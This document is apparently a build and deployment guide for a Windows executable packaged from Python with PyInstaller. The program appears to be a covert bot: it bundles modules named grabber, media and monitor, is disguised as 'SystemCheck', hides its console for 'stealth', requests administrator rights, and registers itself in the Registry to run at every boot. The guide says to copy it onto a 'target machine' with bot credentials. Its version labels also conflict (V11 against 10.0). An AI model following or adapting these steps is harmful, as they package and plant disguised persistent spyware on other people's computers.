# 📦 BUILD EXECUTABLE (EXE) - V11

> **Version:** 11.0  
> **Tool:** PyInstaller 6.17.0

---

## 🚀 Quick Build

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V11.py
```

**Output:** `dist/SystemCheck.exe` (~75-80 MB with Python runtime)

---

## 📋 Prerequisites

1. **Python 3.8+** installed (3.13 recommended)
2. **Dependencies installed:**
   ```bash
   pip install -r requirements.txt
   ```
3. **PyInstaller installed:**
   ```bash
   pip install pyinstaller
   ```
4. **icon.ico** file (already included in project)

---

## 🔧 Build Steps

### Step 1: Verify Setup
```bash
python verify_setup.py
```

### Step 2: Clean (Optional)
```bash
rmdir /s build dist
del SystemCheck.spec
```

### Step 3: Build
```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V11.py
```

**PyInstaller automatically includes all imported modules** (config.py, utils.py, grabber.py, media.py, monitor.py).

### Step 4: Verify Output
```bash
dir dist\SystemCheck.exe
```

---

## 📂 Deployment

1. **Copy to target machine:**
   - `dist/SystemCheck.exe`
   - `.env` (same folder as EXE, with valid API_TOKEN and ADMIN_ID)

2. **Run as Administrator:**
   ```bash
   Right-click SystemCheck.exe → Run as administrator
   ```

3. **Auto-startup:**
   - Bot automatically registers in Windows Registry
   - Runs on every system boot

---

## ⚙️ PyInstaller Options

| Option | Purpose |
|--------|---------|
| `--onefile` | Single EXE file (not folder) |
| `--noconsole` | Hide console window (stealth) |
| `--uac-admin` | Request admin privilege at startup |
| `--icon=icon.ico` | Set EXE icon |
| `--name="SystemCheck"` | Output filename |

---

## ⏱️ Build Stats

- **Build time:** 2-5 minutes
- **EXE size:** 75-80 MB (includes Python 3.13 runtime)
- **First startup:** 20-30 seconds
- **Subsequent startup:** 5-10 seconds (cached)

---

## ❓ Troubleshooting

**Build hangs?**
- Clear: `rmdir /s build dist __pycache__`
- Reinstall PyInstaller: `pip install --upgrade pyinstaller`

**"Module not found"?**
- Verify: `python -c "import V10"`
- Reinstall deps: `pip install -r requirements.txt`

**EXE won't run?**
- Ensure `.env` is in same folder as EXE
- Run as Administrator
- Check `bot.log` for error details

**"Access denied" error?**
- Run Command Prompt as Administrator
- Retry build command

---

## 📝 Notes

- PyInstaller includes all imported dependencies automatically
- First run may take 30+ seconds (Python startup)
- Avoid running from slow USB/network drives
- If build fails, clean and retry: `rmdir /s build dist __pycache__ .pytest_cache`

---

**Developer:** TsByin | **Version:** 10.0
